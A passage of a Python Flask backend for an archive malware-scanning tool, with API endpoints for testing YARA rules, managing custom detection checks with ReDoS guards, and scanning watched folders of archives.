        return jsonify({"error": "YARA rule too large (max 64 KB)"}), 400

    try:
        import yara as _yara
    except ImportError:
        return jsonify({"error": "yara-python not installed"}), 503

    try:
        compiled = _yara.compile(source=rule)
    except Exception as e:
        return jsonify({"error": f"Compile error: {e}"}), 400

    if not scan_id:
        return jsonify({"ok": True, "compiled": True, "matches": [], "note": "No scan selected — rule compiled OK"})

    scan = database.get_scan(int(scan_id))
    if not scan:
        return jsonify({"error": "Scan not found"}), 404

    # We don't have the original file anymore — test against stored hashes/findings only
    # Return a "compiled OK" result with note
    return jsonify({
        "ok": True,
        "compiled": True,
        "matches": [],
        "note": "Rule compiled successfully. Live testing against stored scans is not available (original files are not retained). Upload the archive via File Analyzer to test rules against it.",
    })


# ── Custom checks API ─────────────────────────────────────────────────────────

@app.route("/api/custom-checks")
def api_get_custom_checks():
    return jsonify(database.get_custom_checks())


@app.route("/api/custom-checks", methods=["POST"])
def api_save_custom_check():
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    body        = _body_json()
    name        = _str_field(body.get("name"), max_len=80).strip()
    type_       = _str_field(body.get("type")).strip()
    pattern     = _str_field(body.get("pattern")).strip()
    severity    = _str_field(body.get("severity"), "medium").strip().lower()
    description = _str_field(body.get("description"), max_len=200).strip()

    if not name or not type_ or not pattern:
        return jsonify({"error": "name, type, and pattern are required"}), 400
    if type_ not in ("regex", "string", "extension", "filename"):
        return jsonify({"error": "type must be: regex, string, extension, or filename"}), 400
    if severity not in ("critical", "high", "medium", "low", "info"):
        return jsonify({"error": "Invalid severity"}), 400

    if type_ == "regex":
        import re
        if len(pattern) > 1_000:
            return jsonify({"error": "Regex pattern too long (max 1 000 chars)"}), 400
        # Reject patterns with nested quantifiers — a common ReDoS construct.
        # e.g. (a+)+  ([a-z]*)+  (.*){2,}  — all catastrophically backtrack.
        _NESTED_QUANT = re.compile(r'\([^)]*[+*][^)]*\)[+*{?]|\([^)]+\)\{[0-9]')
        if _NESTED_QUANT.search(pattern):
            return jsonify({"error": "Pattern contains a nested quantifier that may cause catastrophic backtracking"}), 400
        try:
            re.compile(pattern)
        except re.error as e:
            return jsonify({"error": f"Invalid regex: {e}"}), 400

    if len(pattern) > 4_000:
        return jsonify({"error": "Pattern too long (max 4 000 chars)"}), 400

    check_id = database.save_custom_check(name, type_, pattern, severity, description)
    return jsonify({"id": check_id})


@app.route("/api/custom-checks/<int:check_id>", methods=["DELETE"])
def api_delete_custom_check(check_id):
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    database.delete_custom_check(check_id)
    return jsonify({"ok": True})


@app.route("/api/custom-checks/<int:check_id>/toggle", methods=["POST"])
def api_toggle_custom_check(check_id):
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    body    = _body_json()
    enabled = bool(body.get("enabled", True))
    database.toggle_custom_check(check_id, enabled)
    return jsonify({"ok": True})


# ── Campaigns API ─────────────────────────────────────────────────────────────

@app.route("/api/campaigns")
def api_campaigns():
    return jsonify(database.get_campaigns())


# ── Watch folder API ──────────────────────────────────────────────────────────

@app.route("/api/watch-folders")
def api_get_watch_folders():
    return jsonify(database.get_watch_folders())


@app.route("/api/watch-folders", methods=["POST"])
def api_add_watch_folder():
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    body = _body_json()
    path = _str_field(body.get("path")).strip()
    if not path:
        return jsonify({"error": "path is required"}), 400
    # Resolve symlinks and .. so that /tmp/../etc becomes /private/etc
    real = os.path.realpath(path)
    if not os.path.isdir(real):
        return jsonify({"error": "Directory not found"}), 400
    if real == "/" or any(real == p or real.startswith(p + os.sep)
                          for p in _SYSTEM_PATH_PREFIXES):
        return jsonify({"error": "Path is a restricted system directory"}), 400
    folder_id = database.add_watch_folder(real)
    return jsonify({"id": folder_id})


@app.route("/api/watch-folders/<int:folder_id>", methods=["DELETE"])
def api_delete_watch_folder(folder_id):
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    database.delete_watch_folder(folder_id)
    return jsonify({"ok": True})


@app.route("/api/watch-folders/<int:folder_id>/toggle", methods=["POST"])
def api_toggle_watch_folder(folder_id):
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    body    = _body_json()
    enabled = bool(body.get("enabled", True))
    database.toggle_watch_folder(folder_id, enabled)
    return jsonify({"ok": True})


@app.route("/api/watch-folders/<int:folder_id>/scan", methods=["POST"])
def api_scan_watch_folder(folder_id):
    """Manually trigger a scan of all archives in a watched folder."""
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403

    folders = database.get_watch_folders()
    folder  = next((f for f in folders if f["id"] == folder_id), None)
    if not folder:
        return jsonify({"error": "Not found"}), 404

    path    = folder["path"]
    results = []
    custom  = database.get_custom_checks()

    archive_exts = {".zip", ".jar", ".apk", ".war", ".ear",
                    ".tar", ".tgz", ".tbz2", ".txz"}
    try:
        entries = [e for e in os.scandir(path) if e.is_file()]
    except OSError:
        return jsonify({"error": "Cannot read watch folder — check permissions"}), 400

    for entry in entries:
        lower = entry.name.lower()
        ext   = os.path.splitext(lower)[1]
        if ext not in archive_exts and not any(lower.endswith(s) for s in (".tar.gz", ".tar.bz2", ".tar.xz")):
            continue
        try:
            scanner = _get_analyzer(entry.name)
            result  = scanner.analyze(entry.path, custom_checks=custom)
            data    = result_to_json(result, entry.name, entry.stat().st_size)
            scan_id = database.save_scan(data)
            data["scan_id"] = scan_id
            results.append({"filename": entry.name, "scan_id": scan_id,
                             "risk_score": data["metrics"].get("risk_score", 0),
                             "safe": data["safe"]})
        except Exception:
            results.append({"filename": entry.name, "error": "Scan failed"})

    database.mark_folder_scanned(folder_id)
    return jsonify({"scanned": len(results), "results": results})


if __name__ == "__main__":
    app.run(debug=_DEBUG, port=5002, use_reloader=False)
